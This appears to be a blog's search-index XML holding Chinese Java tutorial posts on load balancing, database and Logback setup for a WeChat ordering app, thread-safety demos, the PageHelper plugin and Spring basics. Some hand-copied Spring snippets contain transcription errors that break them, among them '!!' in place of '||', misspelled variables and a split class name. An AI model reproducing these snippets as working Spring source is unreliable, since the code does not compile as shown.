Server来动态解析域名服务，优点是速度快，不需要经过其他的代理服务器，缺点是由于缓存的原因，当一台服务器挂了之后无更新，造成无法访问的问题。 集群负载均衡：分为硬件负载均衡和软件负载均衡。其中硬件负载均衡是一般使用一台专门的硬件设备来转发请求，优点是性能好，缺点是设备昂贵，不方便动态扩容。软件负载均衡是一种比较普遍的负载方式，他的特点是使用成本特别低，直接使用廉价的PC即可，缺点是一般一次访问请求要经过多次代理服务器，会增加网络延时。比如用两台四层负载均衡的LVS，利用IP地址进行地址转发；下面用三台HAProxy进行七层负载，可以根据用户的HTTP请求头进行负载均衡。 操作系统负载均衡：利用操作系统级别的软中断或者硬件中断来达到负载均衡。 几种负载均衡的算法介绍 轮询（默认） 每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。 weight 指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。 ip_hash 每个请求按访问ip的hash结果分配，这样每个访客固定访问同一个后端服务器，可以解决session的问题。但是不能解决宕机问题。前三种是nginx自带的，直接在配置文件中配置即可使用。 fair（第三方） 按后端服务器的相应时间来分配请求，相应时间短的优先分配。 url_hash（第三方） 按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。]]></content>
      <tags>
        <tag>深入分析Java Web技术内幕</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.数据库设计和基础环境搭建]]></title>
    <url>%2F2018%2F07%2F21%2F1.%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 1.数据库设计1.数据库设计和基础环境搭建 商品表：商品名称、图片链接等信息 类目表：类目下有多种商品 订单详情表：订单的具体内容，比如什么商品，商品数量等 订单主表：买家信息、订单总额、支付信息等，下面有多个订单详情记录 卖家信息：权限认证等 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667-- 类目create table `product_category` ( `category_id` int not null auto_increment, `category_name` varchar(64) not null comment '类目名字', `category_type` int not null comment '类目编号', `create_time` timestamp not null default current_timestamp comment '创建时间', `update_time` timestamp not null default current_timestamp on update current_timestamp comment '修改时间', primary key (`category_id`), unique key `uqe_category_type'` (`category_type`));-- 商品create table `product_info` ( `product_id` varchar(32) not null, `product_name` varchar(64) not null comment '商品名称', `product_price` decimal(8,2) not null comment '单价', `product_stock` int not null comment '库存', `product_description` varchar(64) comment '描述', `product_icon` varchar(512) comment '小图', `product_status` tinyint(3) DEFAULT '0' COMMENT '商品状态,0正常1下架', `category_type` int not null comment '类目编号', `create_time` timestamp not null default current_timestamp comment '创建时间', `update_time` timestamp not null default current_timestamp on update current_timestamp comment '修改时间', primary key (`product_id`));-- 订单create table `order_master` ( `order_id` varchar(32) not null, `buyer_name` varchar(32) not null comment '买家名字', `buyer_phone` varchar(32) not null comment '买家电话', `buyer_address` varchar(128) not null comment '买家地址', `buyer_openid` varchar(64) not null comment '买家微信openid', `order_amount` decimal(8,2) not null comment '订单总金额', `order_status` tinyint(3) not null default '0' comment '订单状态, 默认为新下单', `pay_status` tinyint(3) not null default '0' comment '支付状态, 默认未支付', `create_time` timestamp not null default current_timestamp comment '创建时间', `update_time` timestamp not null default current_timestamp on update current_timestamp comment '修改时间', primary key (`order_id`), key `idx_buyer_openid` (`buyer_openid`));-- 订单详情表create table `order_detail` ( `detail_id` varchar(32) not null, `order_id` varchar(32) not null, `product_id` varchar(32) not null, `product_name` varchar(64) not null comment '商品名称', `product_price` decimal(8,2) not null comment '当前价格,单位分', `product_quantity` int not null comment '数量', `product_icon` varchar(512) comment '小图', `create_time` timestamp not null default current_timestamp comment '创建时间', `update_time` timestamp not null default current_timestamp on update current_timestamp comment '修改时间', primary key (`detail_id`), key `idx_order_id` (`order_id`));-- 卖家(登录后台使用, 卖家登录之后可能直接采用微信扫码登录，不使用账号密码)create table `seller_info` ( `id` varchar(32) not null, `username` varchar(32) not null, `password` varchar(32) not null, `openid` varchar(64) not null comment '微信openid', `create_time` timestamp not null default current_timestamp comment '创建时间', `update_time` timestamp not null default current_timestamp on update current_timestamp comment '修改时间', primary key (`id`)) comment '卖家信息表'; 2.日志简介 日志框架：是一套能实现日志输出的工具包 日志：能够描述系统运行状态的所有时间都可以算作日志 2.1日志框架的能力 定制输出目标 定制输出格式 携带上下文信息：进程、堆栈、时间戳 运行时选择性输出：正常日志、db慢的信息 灵活的配置 优异的性能 2.2常见的日志框架 接口：JCL、SLF4j、jboss-logging 日志实现：Log4j,Log4j2,Logback,JUL 这里选用SLF4j+Logback 3.日志实战3.1需求 日志按天滚动分割 info和error日志输出到不同文件 3.2Logback在SpringBoot中配置方式一可以直接在applicatin.properties或者application.yml中配置,以在application.yml中配置为例: 12345logging: pattern: console: &quot;%d - %msg%n&quot; file: /var/log/tomcat/sell.log level: com.imooc.LoggerTest: debug(这里可以指定某个类的日志级别) 可以发现，这种配置方式简单，但能实现的功能也很局限，只能 定制输出格式 输出文件的路径 指定某个包下的日志级别 如果需要完成我们的需求，这就得用第二种配置了。 3.3Logback在SpringBoot中配置方式二在resource目录下新建logback-spring.xml, 内容如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?xml version="1.0" encoding="UTF-8" ?&gt; &lt;configuration&gt; &lt;appender name="consoleLog" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;layout class="ch.qos.logback.classic.PatternLayout"&gt; &lt;pattern&gt; %d - %msg%n &lt;/pattern&gt; &lt;/layout&gt; &lt;/appender&gt; &lt;appender name="fileInfoLog" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;DENY&lt;/onMatch&gt; &lt;onMismatch&gt;ACCEPT&lt;/onMismatch&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;pattern&gt; %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;!--滚动策略--&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--路径，可以换成自己目录--&gt; &lt;fileNamePattern&gt;/var/log/tomcat/sell/info.%d.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;appender name="fileErrorLog" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;pattern&gt; %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;!--滚动策略--&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--路径，可以换成自己目录--&gt; &lt;fileNamePattern&gt;/var/log/tomcat/sell/error.%d.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;root level="info"&gt; &lt;!--控制台输出--&gt; &lt;appender-ref ref="consoleLog" /&gt; &lt;!--除了error级别的日志都写在这里面，所以这里会将info和warn写在一个info文件中--&gt; &lt;appender-ref ref="fileInfoLog" /&gt; &lt;!--error级别的日志写在这里面--&gt; &lt;appender-ref ref="fileErrorLog" /&gt; &lt;/root&gt; &lt;/configuration&gt; 每一个appender你可以理解为一个日志处理策略。 第一个appender的name=&quot;consoleLog&quot;, 名字是自己随意取的，取这个名字，表示这个策略用于控制台的日志。我们重点看第二个和第三个appender 因为要把info和error日志输入到不同文件， 所以我们分别建了两个appender。 rollingPolicy是滚动策略，这里我们设置按时间滚动 filter是日志的过滤方式，我们在fileInfoLog里做了如下过滤 123&lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;DENY&lt;/onMatch&gt; &lt;onMismatch&gt;ACCEPT&lt;/onMismatch&gt; 上述代码翻译之后：拦截ERROR级别的日志。如果匹配到了，则禁用处理。如果不匹配，则接受，开始处理日志。 那有的同学要问了，不能这样写吗 1&lt;level&gt;INFO&lt;/level&gt; 这样不是只拦截INFO日志了吗？ 不对！ 这就得说一下日志级别了 DEBUG -&gt;INFO -&gt; WARN -&gt;ERROR 如果你设置的日志级别是INFO，那么是会拦截ERROR日志的哦。 也就是说，设置日志级别是INFO，那么所以级别比他高的日志都会进来。所以需要过滤一下高级别日志。 4.彩蛋启动时改为佛祖保佑，只需要在resources目录下增加banner.txt文件即可: 12345678910111213141516171819202122////////////////////////////////////////////////////////////////////// _ooOoo_ //// o8888888o //// 88&quot; . &quot;88 //// (| ^_^ |) //// O\ = /O //// ____/`---&apos;\____ //// .&apos; \\| |// `. //// / \\||| : |||// \ //// / _||||| -:- |||||- \ //// | | \\\ - /// | | //// | \_| &apos;&apos;\---/&apos;&apos; | | //// \ .-\__ `-` ___/-. / //// ___`. .&apos; /--.--\ `. . ___ //// .&quot;&quot; &apos;&lt; `.___\_&lt;|&gt;_/___.&apos; &gt;&apos;&quot;&quot;. //// | | : `- \`.;`\ _ /`;.`/ - ` : | | //// \ \ `-. \_ __\ /__ _/ .-` / / //// ========`-.____`-.___\_____/___.-`____.-&apos;======== //// `=---=&apos; //// ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //// 佛祖保佑 永不宕机 永无BUG ////////////////////////////////////////////////////////////////////// 另外，源码地址： https://gitee.com/_swg/wxorder]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.基础介绍和线程安全性问题展示]]></title>
    <url>%2F2018%2F07%2F21%2F1.%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D%E5%92%8C%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98%E5%B1%95%E7%A4%BA%2F</url>
    <content type="text"><![CDATA[本系列再对java并发的认识抬高一个台阶！ 基础的概念 并发 多个线程操作相同的资源，保证线程安全，合理使用资源。 高并发 服务能够同时处理很多请求，提高程序性能。 CPU多级缓存 cpu速度太快，主内存速度跟不上，cpu常常需要等待主内存，浪费cpu资源。所以cache出现了，缓解了cpu和主内存之间速度不匹配的问题(cpu-&gt;cache-&gt;memory) 时间局部性：如果某个数据被访问，那么在不久的将来他很有可能再次被访问。 空间局部性：如果某个数据被访问，那么与它相邻的数据也可能被访问。 CPU乱序执行优化 处理器为提高运算速度而做出违背代码原有顺序的优化。 java内存模型 并发模拟工具 postman apache bench：ab -n 5000(请求总数) -c 200(并发数) url jmeter springboot项目初始化 需要注意的是需要引入spring-boot-starter-web,要不然项目起不来。 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; lombok slf4j 1234&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt;&lt;/dependency&gt; 几个注解，注明是否是线程安全以及是否是推荐的写法。以是线程安全为例。 12345678910111213import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;/** * 标注哪个类是线程安全的 */@Target(ElementType.TYPE)@Retention(RetentionPolicy.SOURCE)//编译时就会被忽略public @interface ThreadSafe &#123; String value() default "";&#125; 代码实现并发模拟一共有5000个请求，并发请求为200. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546@Slf4j@NotThreadSafepublic class ConcurrencyTest &#123; //总请求数 public static int clientTotal = 5000; //并发数 public static int threadTotal = 200; //计数值 public static int count = 0; public static void main(String[] args) &#123; //线程池 ExecutorService executorService = Executors.newCachedThreadPool(); //信号量，控制并发线程数 Semaphore semaphore = new Semaphore(threadTotal); //CountDownLatch，到0就表示线程全部执行完 CountDownLatch countDownLatch = new CountDownLatch(clientTotal); for (int i=0; i&lt;clientTotal; i++)&#123; executorService.execute(() -&gt; &#123; try&#123; //达到threadTotal并发数了，就会阻塞add(),等返回之后再继续执行 semaphore.acquire(); add(); semaphore.release(); &#125;catch (Exception e)&#123; log.error("semaphore exception",e); &#125; //减一 countDownLatch.countDown(); &#125;); &#125; try &#123; //没有减到0，那阻塞在这里；否则执行下面代码 countDownLatch.await(); &#125; catch (InterruptedException e) &#123; log.error("countDownLatch exception",e); &#125; log.info("result --&gt; &#123;&#125;",count); executorService.shutdown(); &#125; public static void add()&#123; count++; &#125;&#125; 实验结果会出现小于5000的值，说明在并发情况下，出现了线程不安全的问题。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.初步认识PageHelper分页插件原理和使用]]></title>
    <url>%2F2018%2F07%2F21%2F1.%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86PageHelper%E5%88%86%E9%A1%B5%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[没有从源码的角度一步一步分析PageHelper分页插件的实现原理，只是大概讲讲其中的门道，等后面有了mybatis源码分析的基础，再回过头来从源码的角度一步一步地看它的实现原理。 分页插件的必要性互联网应用中，分页可谓无处不在，在每个需要展示数据的地方，都能找到分页的影子。在日常开发中，为了追求效率，通常使用数据库的物理分页。这时，对于一个业务逻辑SQL，大多数情况需要输出两段SQL来达到分页效果：count查询总数和limit分页，这无疑增加了大量的工作量。对于这种大量的、相似的、非业务逻辑的代码，抽象出公共插件是势在必行的。 分页插件原理Mybatis给开发者提供了一个拦截器接口，只要实现了该接口，就可以在Mybatis执行SQL前，作一些自定义的操作。分页插件就是在此基础上开发出来的，对于一个需要分页的SQL，插件会拦截并生成两段SQL。举一个简单的例子： 原SQL： 1select * from table where a = '1' 拦截后的查询总数SQL： 1select count(*) from table where a = '1' 拦截后的分页SQL： 1select * from table where a = '1' limit 5,10 这样我们只需要根据业务逻辑开发原SQL，不需关心分页语法对原SQL的影响，拦截器已经为我们处理好了。 面试问到mybatis是如何分页以及分页插件的原理，大概可以这样说： mybatis是通过RowBounds对象进行分页的，他针对返回结果集ResultSet进行内存分页，而非物理分页。 分页插件通过mybatis提供的分页插件接口进行实现，通过拦截器拦截需要执行的sql并重写sql，以此来添加对应的参数，最终实现分页效果。 简单使用Maven依赖123456&lt;!-- 分页插件 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper&lt;/artifactId&gt; &lt;version&gt;5.0.0&lt;/version&gt;&lt;/dependency&gt; Spring配置文件只需要在原来配置Mybatis的SqlSessionFactoryBean的地方加上分页插件的配置即可，具体区别请看以下的对比： 原来的配置方式： 1234&lt;bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;property name="mapperLocations" value="classpath*:mappers/*Mapper.xml"/&gt;&lt;/bean&gt; 加上分页插件的配置方式： 1234567891011121314151617&lt;bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;property name="mapperLocations" value="classpath*:mappers/*Mapper.xml"/&gt; &lt;!-- 分页插件 --&gt; &lt;property name="plugins"&gt; &lt;array&gt; &lt;bean class="com.github.pagehelper.PageHelper"&gt; &lt;property name="properties"&gt; &lt;value&gt; dialect=mysql &lt;/value&gt; &lt;/property&gt; &lt;/bean&gt; &lt;/array&gt; &lt;/property&gt;&lt;/bean&gt; 可以看到仅仅是加了&lt;property name=&quot;plugins&quot;&gt;的配置。在&lt;property name=&quot;properties&quot;&gt;里可以配置分页参数，一般情况下配置数据库类型mysql即可。完整的参数如下： 123456789101112131415161718&lt;!-- 该参数默认为false --&gt;&lt;!-- 设置为true时，会将RowBounds第一个参数offset当成pageNum页码使用 --&gt;&lt;!-- 和startPage中的pageNum效果一样--&gt;&lt;property name="offsetAsPageNum" value="true"/&gt;&lt;!-- 该参数默认为false --&gt;&lt;!-- 设置为true时，使用RowBounds分页会进行count查询 --&gt;&lt;property name="rowBoundsWithCount" value="true"/&gt;&lt;!-- 设置为true时，如果pageSize=0或者RowBounds.limit = 0就会查询出全部的结果 --&gt;&lt;!-- （相当于没有执行分页查询，但是返回结果仍然是Page类型）--&gt;&lt;property name="pageSizeZero" value="true"/&gt;&lt;!-- 3.3.0版本可用 - 分页参数合理化，默认false禁用 --&gt;&lt;!-- 启用合理化时，如果pageNum&lt;1会查询第一页，如果pageNum&gt;pages会查询最后一页 --&gt;&lt;!-- 禁用合理化时，如果pageNum&lt;1或pageNum&gt;pages会返回空数据 --&gt;&lt;property name="reasonable" value="true"/&gt;&lt;!-- 3.5.0版本可用 - 为了支持startPage(Object params)方法 --&gt;&lt;!-- 增加了一个`params`参数来配置参数映射，用于从Map或ServletRequest中取值 --&gt;&lt;!-- 可以配置pageNum,pageSize,count,pageSizeZero,reasonable,不配置映射的用默认值 --&gt;&lt;property name="params" value="pageNum=start;pageSize=limit;pageSizeZero=zero;reasonable=heli;count=contsql"/&gt; 在代码中使用在需要进行分页的Mybatis方法前调用PageHelper.startPage静态方法即可，紧跟在这个方法后的第一个Mybatis查询方法会被进行分页，然后分页插件会把分页信息封装到PageInfo中。 123456// startPage(第几页, 多少条数据)PageHelper.startPage(pageIndex, pageSize);// Mybatis查询方List&lt;InstanceVO&gt; list = instanceDao.select(instance);// 用PageInfo对结果进行包装PageInfo pageInfo = new PageInfo(list); 以这种对原SQL无侵害的方法，就可以得到分页的效果和详细的分页信息。PageInfo包含了非常全面的分页属性：123456789101112131415161718192021222324252627282930313233343536373839404142public class PageInfo&lt;T&gt; implements Serializable &#123; private static final long serialVersionUID = 1L; //当前页 private int pageNum; //每页的数量 private int pageSize; //当前页的数量 private int size; //由于startRow和endRow不常用，这里说个具体的用法 //可以在页面中"显示startRow到endRow 共size条数据" //当前页面第一个元素在数据库中的行号 private int startRow; //当前页面最后一个元素在数据库中的行号 private int endRow; //总记录数 private long total; //总页数 private int pages; //结果集 private List&lt;T&gt; list; //第一页 private int firstPage; //前一页 private int prePage; //下一页 private int nextPage; //最后一页 private int lastPage; //是否为第一页 private boolean isFirstPage = false; //是否为最后一页 private boolean isLastPage = false; //是否有前一页 private boolean hasPreviousPage = false; //是否有下一页 private boolean hasNextPage = false; //导航页码数 private int navigatePages; //所有导航页号 private int[] navigatepageNums; ...&#125; 使用分页插件时，不需要在分页的地方手写分页SQL和count的SQL，不需要更改已有的业务代码，只需要在执行SQL前调用一句代码即可实现分页，并得到丰富的分页信息。有了这些分页信息，前端可以选用多种分页方法，非常方便！ 原文：https://www.ciphermagic.cn/mybatis-page-2.html]]></content>
      <tags>
        <tag>mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.Spring知识点提炼]]></title>
    <url>%2F2018%2F07%2F21%2F1.Spring%E7%9F%A5%E8%AF%86%E7%82%B9%E6%8F%90%E7%82%BC%2F</url>
    <content type="text"><![CDATA[spring面试知识点重灾区。 1. Spring框架的作用 轻量：Spring是轻量级的，基本的版本大小为2MB 控制反转：Spring通过控制反转实现了松散耦合，对象们给出它们的依赖，而不是创建或查找依赖的对象们。 面向切面的编程AOP:Spring支持面向切面的编程，并且把应用业务逻辑和系统服务分开。 容器：Spring包含并管理应用中对象的生命周期和配置 MVC框架： Spring-MVC 事务管理：Spring提供一个持续的事务管理接口，可以扩展到上至本地事务下至全局事务JTA 异常处理：Spring提供方便的API把具体技术相关的异常 2. Spring的组成 Spring由7个模块组成： Spring Core: 核心容器提供 Spring 框架的基本功能。核心容器的主要组件是BeanFactory，它是工厂模式的实现。BeanFactory 使用控制反转 （IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。 Spring 上下文：Spring 上下文是一个配置文件，向 Spring 框架提供上下文信息。Spring 上下文包括企业服务，例如 JNDI、EJB、电子邮件、国际化、校验和调度功能。 Spring AOP：通过配置管理特性，Spring AOP 模块直接将面向方面的编程功能集成到了 Spring 框架中。所以，可以很容易地使 Spring 框架管理的任何对象支持 AOP。Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。通过使用 Spring AOP，不用依赖 EJB 组件，就可以将声明性事务管理集成到应用程序中。 Spring DAO：JDBC DAO 抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理和不同数据库供应商抛出的错误消息。异常层次结构简化了错误处理，并且极大地降低了需要编写的异常代码数量（例如打开和关闭连接）。Spring DAO 的面向 JDBC 的异常遵从通用的 DAO 异常层次结构。 Spring ORM：Spring 框架插入了若干个 ORM 框架，从而提供了 ORM 的对象关系工具，其中包括 JDO、Hibernate 和 iBatis SQL Map。所有这些都遵从 Spring 的通用事务和 DAO 异常层次结构。 Spring Web 模块：Web` 上下文模块建立在应用程序上下文模块之上，为基于 Web 的应用程序提供了上下文。所以，Spring 框架支持与 Jakarta Struts 的集成。Web 模块还简化了处理多部分请求以及将请求参数绑定到域对象的工作。 Spring MVC 框架：MVC 框架是一个全功能的构建 Web 应用程序的 MVC 实现。通过策略接口，MVC 框架变成为高度可配置的，MVC 容纳了大量视图技术，其中包括 JSP、Velocity、Tiles、iText 和 POI。 3. Spring容器Spring的容器可以分为两种类型 BeanFactory：（org.springframework.beans.factory.BeanFactory接口定义）是最简答的容器，提供了基本的DI支持。最常用的BeanFactory实现就是XmlBeanFactory类，它根据XML文件中的定义加载beans，该容器从XML文件读取配置元数据并用它去创建一个完全配置的系统或应用。 ApplicationContext应用上下文：（org.springframework.context.ApplicationContext）基于BeanFactory之上构建，并提供面向应用的服务。 4. ApplicationContext通常的实现 ClassPathXmlApplicationContext：从类路径下的XML配置文件中加载上下文定义，把应用上下文定义文件当做类资源。 FileSystemXmlApplicationContext：读取文件系统下的XML配置文件并加载上下文定义。 XmlWebApplicationContext：读取Web应用下的XML配置文件并装载上下文定义。 1ApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml"); 5. IOC &amp; DIInversion of Control， 一般分为两种类型：依赖注入DI(Dependency Injection)和依赖查找（Dependency Lookup）.依赖注入应用比较广泛。 Spring IOC负责创建对象，管理对象（DI），装配对象，配置对象，并且管理这些对象的整个生命周期。 优点：把应用的代码量降到最低。容器测试，最小的代价和最小的侵入性使松散耦合得以实现。IOC容器支持加载服务时的饿汉式初始化和懒加载。 DI依赖注入是IOC的一个方面，是个通常的概念，它有多种解释。这概念是说你不用床架对象，而只需要描述它如何被创建。你不在代码里直接组装你的组件和服务，但是要在配置文件里描述组件需要哪些服务，之后一个IOC容器辅助把他们组装起来。IOC的注入方式：1. 构造器依赖注入；2. Setter方法注入。 6. 如何给spring容器提供配置元数据 XML配置文件 基于注解的配置 基于Java的配置@Configuration, @Bean 7. bean标签中的属性 id name class init-method：Bean实例化后会立刻调用的方法 destory-method:Bean从容器移除和销毁前，会调用的方法 factory-method:运行我们调用一个指定的静态方法，从而代替构造方法来创建一个类的实例。 scope：Bean的作用域，包括singleton(默认)，prototype(每次调用都创建一个实例), request,session,global-session（注意spring中的单例bean不是线程安全的） autowired:自动装配 byName, byType, constructor, autodetect(首先阐释使用constructor自动装配，如果没有发现与构造器相匹配的Bean时，Spring将尝试使用byType自动装配) 8. beans标签中相关属性 default-init-method default-destory-method default-autowire：默认为none，应用于Spring配置文件中的所有Bean，注意这里不是指Spring应用上下文，因为你可以定义多个配置文件 Bean的生命周期 创建Bean的实例(factory-method, autowireConstrutor) 属性注入(autowireByName, autowireByType) 初始化Bean 3.1 激活Aware方法：（invokeAwaresMethods）Spring中提供了一些Aware相关接口，比如BeanNameAware, BeanFactoryAware, ApplicationContextAware等，实现这些Aware接口的bean在被初始化之后，可以取得一些相对应的资源。 1234567891011121314private void invokeAwareMethods(final String beanName, final Object bean)&#123; if(bean instanceof Aware) &#123; if(bean instanceof BeanNameAware)&#123; ((BeanNameAware) bean).setBeanName(beanName); &#125; if(bean instanceof BeanClassLoaderAware)&#123; ((BeanClassLoaderAware) bean).setBeanClassLoader(getBeanClassLoader()); &#125; if(bean instanceof BeanFactoryAware)&#123; ((BeanFactoryAware) bean).setBeanFactory(AbstactAutowire CapableBeanFactory.this); &#125; &#125;&#125; 3.2 处理器的应用(BeanPostProcessor接口)：调用客户自定义初始化方法前以及调用自定义初始化方法后分别会调用BeanPostProcessor的postProcessBeforeInitialization和postProcessAfterInitialization方法，使用户可以根据自己的业务需求进行响应的处理。 3.3 激活自定义的init方法（init-method &amp; 自定义实现InitializingBean接口） 12345678910111213141516171819202122232425262728293031protected Object initializeBean(final String beanName, final Object bean, RootBeanDefinetion mbd)&#123; if(System.getSecurityManager() != null)&#123; AccessController.doPrivileged(new PrivilegedAction&lt;Object&gt;()&#123; @Override public Object run() &#123; invokeAwareMethods(beanName,bean); return null; &#125; &#125;); &#125; else&#123; //对特殊的bean处理：Aware, BeanClassLoaderAware, BeanFactoryAware invokeAwareMethods(beanName,bean); &#125; Object wrappedBean = bean; if(mbd == null !! !mbd.isSynthetic())&#123; wrappedBean = applyBeanPostProcessorsBeforeInitialization(wappedBean,beanName); &#125; try&#123; invokeInitMethods(beanName, wappedBean, mbd); &#125; catch(Throwable ex)&#123; throw new BeanCreationException((mbd != null ? mbd.getResourceDescription():null),beanName,"Invocation of init method failed",ex); &#125; if(mbd == null || ！mbd.isSynthetic())&#123; wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName); &#125; return wappedBean;&#125; 使用Bean。 驻留在应用的上下文中，直到该应用上下文被销毁。 销毁(destory-mthod &amp; 实现DisposableBean接口) 10. Spring中注入集合 &lt;list&gt;允许值相同 &lt;set&gt;不允许值相同 &lt;map&gt;&lt;entry key=&quot;&quot; value=&quot;&quot;&gt;&lt;/map&gt;键和值都可以为任意类型，key, key-ref, value-ref, value可以任意搭配 &lt;props&gt;&lt;prop key=&quot;&quot;&gt;XXX&lt;/prop&gt;&lt;/props&gt;键和值都只能是String类型 11. 装配空值1&lt;property name="xxx"&gt;&lt;null/&gt;&lt;/property&gt; 12. 自动装配(autowiring)有助于减少甚至消除配置&lt;property&gt;和&lt;constructor-arg&gt;元素，让Spring自动识别如何装配Bean的依赖关系。&lt;context:annotation-config/&gt; 与之对应的是：自动检测(autodiscovery)，比自动装配更近了一步，让Spring能够自动识别哪些类需要被配置成SpringBean，从而减少对&lt;bean&gt;元素的使用。&lt;context:component-scan&gt; 13. 注解Spring容器默认禁用注解装配。最简单的开启方式&lt;context:annotation-config/&gt;。 Spring支持的几种不同的用于自动装配的注解： Spring自带的@Autowired注解 JSR-330的@Inject注解 JSR-250的@Resource注解 14. @Autowired@Autowired具有强契约特征，其所标注的属性或参数必须是可装配的。如果没有Bean可以装配到@Autowired所标注的属性或参数中，自动装配就会失败，抛出NoSuchBeanDefinitionException. 属性不一定非要装配，null值也是可以接受的。在这种场景下可以通过设置@Autowired的required属性为false来配置自动装配是可选的，如： 12@Autowired(required=false)private Object obj; 注意required属性可以用于@Autowired注解所使用的任意地方。但是当使用构造器装配时，只有一个构造器可以将@Autowired的required属性设置为true。其他使用@Autowired注解所标注的构造器只能将required属性设置为false。此外，当使用@Autowired标注多个构造器时，Spring就会从所有满足装配条件的构造器中选择入参最多的那个构造器。 可以使用@Qualifier明确指定要装配的Bean.如下： 123@Autowired@Qualifier("objName")private Object obj; 15. 自定义的限定器1234@Target(&#123;ElementType.FIELF, ElementType.PARAMETER, ElementType.TYPE&#125;)@Retention(RetentionPolicy.RUNTIME)@Qualifierpublic @Interface SpecialQualifier&#123;&#125; 此时，可以通过自定义的@SpecialQualifier注解来代替@Qualifier来标注，也可以和@Autowired一起使用： 123@Autowired@SpecialQualifierprivate Object obj; 此时,Spring会把自动装配的范围缩小到被@SpecialQualifier标注的Bean中。如果被@SpecialQualifier标注的Bean有多个，我们还可以通过自定义的另一个限定器@SpecialQualifier2来进一步缩小范围。 16. @Autowired优缺点Spring的@Autowired注解是减少Spring XML配置的一种方式。但是它的类会映入对Spring的特定依赖（即使依赖只是一个注解）。 17. @Inject和@Autowired注解一样，@Inject可以用来自动装配属性、方法和构造器；与@Autowired不同的是，@Inject没有required属性。因此@Inject注解所标注的依赖关系必须存在，如果不存在，则会抛出异常。 18. @Named相对于@Autowired对应的Qualifier，@Inject所对应的是@Named注解。 123@Inject@Named("objName")private Object obj; 19. SpEL表达式语法形式在#{}中使用表达式,如： 1&lt;property name="count" value="#&#123;5&#125;"/&gt; 20. @Value@Value是一个新的装配注解，可以让我们使用注解装配String类型的值和基本类型的值，如int, boolean。我们可以通过@Value直接标注某个属性，方法或者方法参数，并传入一个String类型的表达式来装配属性，如： 12@Value("Eruption")private String song; @Value可以配合SpEL表达式一起使用，譬如有些情况下需要读取properties文件中的内容，可以使用： 1@Value("#&#123;configProperties['ora_driver']&#125;") 21. 自动检测Bean&lt;context:component-scan&gt;元素除了完成与&lt;context:annotation-config&gt;一样的工作，还允许Spring自动检测Bean和定义Bean.&lt;context:component-scan&gt;元素会扫描指定的包和其所有子包，如下： 1&lt;context:component-scan base-package="com.zzh.dao" /&gt; 22. 为自动检测标注Bean默认情况下，查找使用构造型（stereotype）注解所标注的类，这些特殊的注解如下： @Component：通用的构造型注解，标志此类为Spring组件 @Controller：标识将该类定义为SpringMVC controller @Repository：标识将该类定义为数据仓库 @Service：标识将该类定义为服务 以@Component为例： 12@Componentpublic class Guitar implements Intrument&#123;&#125; 这里@Component会自动注册Guitar 为Spring Bean，并设置默认的Bean的Id为guitar，首字母大写变小写。注意如果第一个和第二个字母都是大写，默认的Bean的id会有特殊处理。也可以指定Bean的Id如： 